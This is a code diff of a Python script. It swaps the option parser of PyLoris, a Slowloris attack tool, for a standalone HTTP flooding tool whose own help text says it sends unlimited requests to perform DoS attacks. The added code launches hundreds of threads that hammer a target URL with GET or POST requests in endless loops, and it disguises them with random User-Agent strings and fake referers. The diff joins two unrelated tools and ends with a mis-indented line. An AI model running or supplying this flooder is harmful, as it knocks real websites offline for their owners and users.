@@ -1,123 +1,143 @@
-import optparse
+import requests
 import sys
-import time
+import threading
+import random
+import re
+import argparse
 
-def parse_options():
-    parser = optparse.OptionParser(usage = "%prog [options] www.host.com")
-    parser.add_option("-a", "--attacklimit", action = "store", type = "int", dest = "attacklimit", default = 500, help = "Total number of connections to make (0 = unlimited, default = 500)")
-    parser.add_option("-c", "--connectionlimit", action = "store", type = "int", dest = "connectionlimit", default = 500, help = "Total number of concurrent connections to allow (0 = unlimited, default = 500)")
-    parser.add_option("-t", "--threadlimit", action = "store", type = "int", dest = "threadlimit", default = 50, help = "Total number of concurrent threads (0 = unlimited, default = 50)")
-    parser.add_option("-b", "--connectionspeed", action = "store", type = "float", dest = "connectionspeed", default = 1, help = "Individual connection bandwidth in bytes per second (default = 1)")
+host=''
+headers_useragents=[]
+request_counter=0
+printedMsgs = []
 
-    parser.add_option("-f", "--finish", action = "store_true", dest = "finish", default = False, help = "Complete each session rather than leave them unfinished (lessens the effectiveness, increases bandwidth usage)")
-    parser.add_option("-k", "--keepalive", action = "store_true", dest = "keepalive", default = False, help = "Turn Keep-Alive on")
+def printMsg(msg):
+	if msg not in printedMsgs:
+		print ("\n"+msg + " after %i requests" % request_counter)
+		printedMsgs.append(msg)
 
-    parser.add_option("-p", "--port", action = "store", type = "int", dest = "port", default = 80, help = "Port to initiate attack on (default = 80)")
-    parser.add_option("-P", "--page", action = "store", type = "string", dest="page", default = '/', help = "Page to request from the server (default = /)")
-    parser.add_option("-q", "--quit", action = "store_true", dest = "quit", default = False, help = "Quit without receiving data from the server (can shorten the duration of the attack)")
-    parser.add_option("-r", "--requesttype", action = "store", type = "string", dest = "requesttype", default = 'GET', help = "Request type, GET, HEAD, POST, PUT, DELETE, OPTIONS, or TRACE (default = GET)")
-    parser.add_option("-R", "--referer", action = "store", type = "string", dest = "referer", default = '', help = "Set the Referer HTTP header.")
-    parser.add_option("-s", "--size", action = "store", type = "int", dest = "size", default = 0, help = "Size of data segment to attach in cookie (default = 0)")
-    parser.add_option("-S", "--ssl", action = "store_true", dest = "ssl", default = False, help = "Use SSL/TLS connection (for HTTPS testing)")
-    parser.add_option("-u", "--useragent", action = "store", type = "string", dest = "useragent", default = 'pyloris.sf.net', help = "The User-Agent string for connections (defaut = pyloris.sf.net)")
-    parser.add_option("-z", "--gzip", action = "store_true", dest = "gzip", default = False, help = "Request compressed data stream")
+def useragent_list():
+	global headers_useragents
+	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
+	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+	return(headers_useragents)
+	
+def randomString(size):
+	out_str = ''
+	for i in range(0, size):
+		a = random.randint(65, 90)
+		out_str += chr(a)
+	return(out_str)
 
-    parser.add_option("-w", "--timebetweenthreads", action = "store", type = "float", dest = "timebetweenthreads", default = 0, help = "Time to wait between spawning threads in seconds (default = 0)")
-    parser.add_option("-W", "--timebetweenconnections", action = "store", type = "float", dest = "timebetweenconnections", default = 1, help = "Time to wait in between starting connections (default = 1)")
+def initHeaders():
+	useragent_list()
+	global headers_useragents, additionalHeaders
+	headers = {
+				'User-Agent': random.choice(headers_useragents),
+				'Cache-Control': 'no-cache',
+				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
+				'Keep-Alive': str(random.randint(110,120)),
+				'Connection': 'keep-alive'
+				}
 
-    parser.add_option("", "--socksversion", action = "store", type = "string", dest = "socksversion", default = '', help = "SOCKS version, SOCKS4, SOCKS5, or HTTP. Reqires --sockshost and --socksport")
-    parser.add_option("", "--sockshost", action = "store", type = "string", dest = "sockshost", default = '127.0.0.1', help = "SOCKS host address (default = 127.0.0.1)")
-    parser.add_option("", "--socksport", action = "store", type = "int", dest = "socksport", default = 0, help = "SOCKS port number")
-    parser.add_option("", "--socksuser", action = "store", type = "string", dest = "socksuser", default = '', help = "SOCKS username")
-    parser.add_option("", "--sockspass", action = "store", type = "string", dest = "sockspass", default = '', help = "SOCKS password")
+	if additionalHeaders:
+		for header in additionalHeaders:
+			headers.update({header.split(":")[0]:header.split(":")[1]})
+	return headers
 
-    parser.add_option("-v", "--verbosity", action = "store", type = "int", dest = "verbosity", default = 1, help = "Verbosity level")
+def handleStatusCodes(status_code):
+	global request_counter
+	sys.stdout.write("\r%i requests has been sent" % request_counter)
+	sys.stdout.flush()
+	if status_code == 429:
+			printMsg("You have been throttled")
+	if status_code == 500:
+		printMsg("Status code 500 received")
 
-    (options, args) = parser.parse_args()
+def sendGET(url):
+	global request_counter
+	headers = initHeaders()
+	try:
+		request_counter+=1
+		request = requests.get(url, headers=headers)
+		# print 'her'
+		handleStatusCodes(request.status_code)
+	except:
+		pass
 
-    sys.stdout.write("PyLoris, a Python implementation of the Slowloris attack (http://ha.ckers.org/slowloris).\r\n")
+def sendPOST(url, payload):
+	global request_counter
+	headers = initHeaders()
+	try:
+		request_counter+=1
+		if payload:
+			request = requests.post(url, data=payload, headers=headers)
+		else:
+			request = requests.post(url, headers=headers)
+		handleStatusCodes(request.status_code)
+	except:
+		pass
 
-    if len(args) != 1:
-        sys.stderr.write("No host supplied or incorrect number of arguments used.\nUse -h or --help for more information\n")
-        print("args")
-        sys.exit(1)
-    
-    OptionSet = DefaultOptions()
+class SendGETThread(threading.Thread):
+	def run(self):
+		try:
+			while True:
+				global url
+				sendGET(url)
+		except:
+			pass
 
-    OptionSet['host'] = args[0]
-    OptionSet['port'] = options.port
-    OptionSet['ssl'] = options.ssl
-    OptionSet['attacklimit'] = options.attacklimit
-    OptionSet['connectionlimit'] = options.connectionlimit
-    OptionSet['threadlimt'] = options.threadlimit
-    OptionSet['timebetweenthreads'] = options.timebetweenthreads
-    OptionSet['timebetweenconnections'] = options.timebetweenconnections
-    OptionSet['connecitonspeed'] = options.connectionspeed
-    OptionSet['socksversion'] = options.socksversion
-    OptionSet['sockshost'] = options.sockshost
-    OptionSet['socksport'] = options.socksport
-    OptionSet['socksuser'] = options.socksuser
-    OptionSet['sockspass'] = options.sockspass
-    OptionSet['quitimmediately'] = options.quit
+class SendPOSTThread(threading.Thread):
+	def run(self):
+		try:
+			while True:
+				global url, payload
+				sendPOST(url, payload)
+		except:
+			pass
 
-    requesttype = options.requesttype.upper()
-    if requesttype not in ('GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE'):
-        sys.stderr.write('Invalid request type.\nUse -h or --help for more information')
-        sys.exit(3)
 
-    request = '%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s' % (requesttype, options.page, args[0], options.useragent)
+# TODO:
+# check if the site stop responding and alert
 
-    if options.keepalive == True:
-        request += '\r\nKeep-Alive: 300\r\nConnection: Keep-Alive'
+def main(argv):
+	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily')
+	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
+	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
+	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
+	parser.add_argument('-ah', help='Specify addtional header/s. Usage: -ah \'Content-type: application/json\' \'User-Agent: Doser\'', default=None, nargs='*')
+	parser.add_argument('-t', help='Specify number of threads to be used', default=500, type=int)
+	args = parser.parse_args()
 
-    if options.gzip == True:
-        request += '\r\nAccept-Encoding: gzip'
+	global url, payload, additionalHeaders
+	additionalHeaders = args.ah
+	payload = args.d
 
-    if options.referer != '':
-        request += '\r\nReferer: %s' % (options.referer)
+	if args.g:
+		url = args.g
+		for i in range(args.t):
+			t = SendGETThread()
+			t.start()
 
-    if options.size > 0:
-        request += '\r\nCookie: '
-        if options.size > 100:
-            count = options.size / 100
-            for i in range(int(count)):
-                request += ('data%i=%s ' % (i, 'A' * 100))
-            request += 'data=' + ('A' * 100)
-        else:
-            request += 'data=' + ('A' * options.size)
-
-    if options.finish == True:
-        print("Specifying the -f or --finish flags can reduce the effectiveness of the test and increase bandwidth usage.")
-        request += '\r\n\r\n'
-
-    OptionSet['request'] = request
-
-    return OptionSet
-
+	if args.p:
+		url = args.p
+		for i in range(args.t):
+			t = SendPOSTThread()
+			t.start()
+	
+	if len(sys.argv)==1:
+		parser.print_help()
+		exit()
+	
 if __name__ == "__main__":
-    options = parse_options()
-    loris = Loris()
-    loris.LoadOptions(options)
-    loris.start()
-    time.sleep(1)
-
-    while loris.running:
-        status = loris.status()
-
-        try:
-            while True:
-                message = loris.messages.get()
-                print(message)
-        except:
-            pass
-
-        try:
-            while True:
-                error = loris.errors.get()
-                print(error)
-        except:
-            pass
-
-        print('Pyloris has started %i attacks, with %i threads and %i connections currently running.' % status)
-    status = loris.status()
-    print('Pyloris has completed %i attacks.' % (status[0]))
+   main(sys.argv[1:])
